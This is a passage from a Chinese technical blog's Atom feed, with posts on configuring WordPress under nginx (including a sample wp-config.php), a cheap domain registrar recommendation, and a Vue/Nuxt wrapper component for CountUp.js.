$document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置启动安装wordpress"><a href="#配置启动安装wordpress" class="headerlink" title="配置启动安装wordpress"></a>配置启动安装wordpress</h2><p>完成上面的配置后，需要再修改<code>wp-config.php</code>文件配置数据库信息，如下为全部配置信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * The base configuration for WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don&#39;t have to use the web site, you can</span><br><span class="line"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="line"> *</span><br><span class="line"> * This file contains the following configurations:</span><br><span class="line"> *</span><br><span class="line"> * * MySQL settings</span><br><span class="line"> * * Secret keys</span><br><span class="line"> * * Database table prefix</span><br><span class="line"> * * ABSPATH</span><br><span class="line"> *</span><br><span class="line"> * @link https:&#x2F;&#x2F;codex.wordpress.org&#x2F;Editing_wp-config.php</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;jvfast&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;test&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;ssd3434gf5d0ngh&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;**#@+</span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https:&#x2F;&#x2F;api.wordpress.org&#x2F;secret-key&#x2F;1.1&#x2F;salt&#x2F; WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> *&#x2F;</span><br><span class="line">define( &#39;AUTH_KEY&#39;,         &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;SECURE_AUTH_KEY&#39;,  &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;LOGGED_IN_KEY&#39;,    &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;NONCE_KEY&#39;,        &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;AUTH_SALT&#39;,        &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;SECURE_AUTH_SALT&#39;, &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;LOGGED_IN_SALT&#39;,   &#39;put your unique phrase here&#39; );</span><br><span class="line">define( &#39;NONCE_SALT&#39;,       &#39;put your unique phrase here&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;**#@-*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations in one database if you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> *&#x2F;</span><br><span class="line">$table_prefix &#x3D; &#39;wp_&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to true to enable the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * in their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used for debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https:&#x2F;&#x2F;codex.wordpress.org&#x2F;Debugging_in_WordPress</span><br><span class="line"> *&#x2F;</span><br><span class="line">define( &#39;WP_DEBUG&#39;, false );</span><br><span class="line"></span><br><span class="line">&#x2F;* That&#39;s all, stop editing! Happy publishing. *&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;** Absolute path to the WordPress directory. *&#x2F;</span><br><span class="line">if ( ! defined( &#39;ABSPATH&#39; ) ) &#123;</span><br><span class="line"> define( &#39;ABSPATH&#39;, dirname( __FILE__ ) . &#39;&#x2F;&#39; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;** Sets up WordPress vars and included files. *&#x2F;</span><br><span class="line">require_once( ABSPATH . &#39;wp-settings.php&#39; );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>否则会覆盖已经导入的mysql数据库数据,然后访问页面: <a href="http://xxx/" target="_blank" rel="noopener">http://xxx</a>. 会自动加载配置文件信息跳转到首页。</p><h2 id="请求style-css和app-js出现-block-mixed-content错误"><a href="#请求style-css和app-js出现-block-mixed-content错误" class="headerlink" title="请求style.css和app.js出现 block:mixed-content错误"></a>请求style.css和app.js出现 <code>block:mixed-content</code>错误</h2><p>原因是全站采用了https后引用的相关css和js文件由于采用的是frp导致对应的协议是http的要求，此处可以修改git主题下面的<code>functions.php</code>中的<code>GIT_URL</code>参数为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(&#39;GIT_URL&#39;, &#39;https:&#x2F;&#x2F;seniortesting.club&#x2F;wp-content&#x2F;themes&#x2F;git&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;更新日期： 2020/02/21&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;Install-wordpress&quot;&gt;&lt;a href=&quot;#Install-wordpress&quot; class=&quot;headerlink&quot; title=&quot;Install wordpress</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    <category term="wordpress" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/wordpress/"/>
    
    
  </entry>
  
  <entry>
    <title>便宜国外域名推荐列表</title>
    <link href="https://seniortesting.club/posts/mCrwyePn31/"/>
    <id>https://seniortesting.club/posts/mCrwyePn31/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="域名列表"><a href="#域名列表" class="headerlink" title="域名列表"></a>域名列表</h2><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200831215602-2020-08-31.png" alt="20200831215602-2020-08-31"></p><p>国外域名注册商推荐第1名：<strong>Namesilo</strong></p><p>推荐指数：★★★★★</p><p>优缺点对比：<br>优点:</p><ul><li>最便宜</li><li>续费价不变</li><li>免费的隐私保护</li><li>批量查询，方便大量注册</li></ul><p>缺点:</p><ul><li>它家提供主机有点弱，非建站最好选择</li></ul><p>Namesilo是国外最便宜域名注册商，它的缺点其实也没有什么大问题，总之是瑕不掩瑜，如果您在意主机的话，可以推荐使用相关其他主机服务商。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;域名列表&quot;&gt;&lt;a href=&quot;#域名列表&quot; class=&quot;headerlink&quot; title=&quot;域名列表&quot;&gt;&lt;/a&gt;域名列表&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/alterhu2020/Storag</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    <category term="主机和域名" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/%E4%B8%BB%E6%9C%BA%E5%92%8C%E5%9F%9F%E5%90%8D/"/>
    
    
  </entry>
  
  <entry>
    <title>Vue CountUp组件使用及其配置</title>
    <link href="https://seniortesting.club/posts/xd1LEJLaZF/"/>
    <id>https://seniortesting.club/posts/xd1LEJLaZF/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Vue.js component wrap for CountUp.js</p></blockquote><h2 id="安装countup-js"><a href="#安装countup-js" class="headerlink" title="安装countup.js"></a>安装<code>countup.js</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save countup.js </span><br></pre></td></tr></table></figure><h2 id="封装的一个vue版本的countup-js组件-文件位置-components-vue-countup-index"><a href="#封装的一个vue版本的countup-js组件-文件位置-components-vue-countup-index" class="headerlink" title="封装的一个vue版本的countup.js组件(文件位置: /components/vue-countup/index)"></a>封装的一个vue版本的countup.js组件(文件位置: <code>/components/vue-countup/index</code>)</h2><p>组件源码参考: <a href="https://github.com/xlsdg/vue-countup-v2" target="_blank" rel="noopener">vue-countup-v2</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;span /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; CountUp &#125; <span class="keyword">from</span> <span class="string">&#x27;countup.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> typeOf = <span class="function"><span class="params">type</span> =&gt;</span> <span class="function"><span class="params">object</span> =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(object) === <span class="string">`[object <span class="subst">$&#123;type&#125;</span>]`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const isString = typeOf(&#x27;String&#x27;);</span></span><br><span class="line"><span class="comment">// const isObject = typeOf(&#x27;Object&#x27;);</span></span><br><span class="line"><span class="keyword">const</span> isFunction = typeOf(<span class="string">&#x27;Function&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  __countup__: CountUp,</span><br><span class="line">  name: <span class="string">&#x27;VueCountUp&#x27;</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    delay: &#123;</span><br><span class="line">      type: <span class="built_in">Number</span>,</span><br><span class="line">      required: <span class="literal">false</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    endVal: &#123;</span><br><span class="line">      type: <span class="built_in">Number</span>,</span><br><span class="line">      required: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    options: &#123;</span><br><span class="line">      type: <span class="built_in">Object</span>,</span><br><span class="line">      required: <span class="literal">false</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          duration: <span class="number">2</span>,</span><br><span class="line">          useEasing: <span class="literal">true</span>,</span><br><span class="line">          useGrouping: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      instance: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// computed: &#123;&#125;,</span></span><br><span class="line">  watch: &#123;</span><br><span class="line">    endVal: &#123;</span><br><span class="line">      handler (value) &#123;</span><br><span class="line">        <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.update)) &#123;</span><br><span class="line">          that.instance.update(value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      deep: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// beforeCreate() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;beforeCreate&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// created() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;created&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// beforeMount() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;beforeMount&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  mounted () &#123;</span><br><span class="line">    <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line">    <span class="comment">// console.log(&#x27;mounted&#x27;);</span></span><br><span class="line">    that.create()</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// beforeUpdate() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;beforeUpdate&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// updated() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;updated&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// activated() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;activated&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// deactivated() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;deactivated&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  beforeDestroy () &#123;</span><br><span class="line">    <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line">    <span class="comment">// console.log(&#x27;beforeDestroy&#x27;);</span></span><br><span class="line">    that.destroy()</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    create () &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line">      <span class="keyword">if</span> (that.instance) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> dom = that.$el</span><br><span class="line">      <span class="keyword">const</span> instance = <span class="keyword">new</span> CountUp(</span><br><span class="line">        dom,</span><br><span class="line">        that.endVal,</span><br><span class="line">        that.options</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (instance.error) &#123;</span><br><span class="line">        <span class="comment">// error</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      that.instance = instance</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.delay &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        that.$emit(<span class="string">&#x27;ready&#x27;</span>, instance, CountUp)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> instance.start(<span class="function">() =&gt;</span> that.$emit(<span class="string">&#x27;ready&#x27;</span>, instance, CountUp)), that.delay)</span><br><span class="line">    &#125;,</span><br><span class="line">    destroy () &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line">      that.instance = <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    printValue (value) &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.printValue)) &#123;</span><br><span class="line">        <span class="keyword">return</span> that.instance.printValue(value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    start (callback) &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.start)) &#123;</span><br><span class="line">        <span class="keyword">return</span> that.instance.start(callback)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    pauseResume () &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.pauseResume)) &#123;</span><br><span class="line">        <span class="keyword">return</span> that.instance.pauseResume()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    reset () &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.reset)) &#123;</span><br><span class="line">        <span class="keyword">return</span> that.instance.reset()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    update (newEndVal) &#123;</span><br><span class="line">      <span class="keyword">const</span> that = <span class="built_in">this</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (that.instance &amp;&amp; isFunction(that.instance.update)) &#123;</span><br><span class="line">        <span class="keyword">return</span> that.instance.update(newEndVal)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// destroyed() &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;destroyed&#x27;);</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// errorCaptured(err, vm, info) &#123;</span></span><br><span class="line">  <span class="comment">//   const that = this;</span></span><br><span class="line">  <span class="comment">//   console.log(&#x27;errorCaptured&#x27;);</span></span><br><span class="line">  <span class="comment">//   return true;</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">&quot;less&quot;</span> scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="plugins-nuxt-countup配置"><a href="#plugins-nuxt-countup配置" class="headerlink" title="plugins/nuxt-countup配置"></a><code>plugins/nuxt-countup</code>配置</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> CountUp <span class="keyword">from</span> <span class="string">&#x27;@/components/vue-countup/index&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line"><span class="comment">// register component to use</span></span><br><span class="line">  Vue.component(<span class="string">&#x27;CountUp&#x27;</span>, CountUp)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nuxt-config-js中配置参数如下"><a href="#nuxt-config-js中配置参数如下" class="headerlink" title="nuxt.config.js中配置参数如下"></a><code>nuxt.config.js</code>中配置参数如下</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugins: [&#123; <span class="attr">src</span>: <span class="string">&#x27;~/plugins/nuxt-countup&#x27;</span>, <span class="attr">ssr</span>: <span class="literal">false</span> &#125;]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Vue.js component wrap for CountUp.js&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>Element-UI还香吗，是否真的已死？</title>
    <link href="https://seniortesting.club/posts/GM88B1kH7H/"/>
    <id>https://seniortesting.club/posts/GM88B1kH7H/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
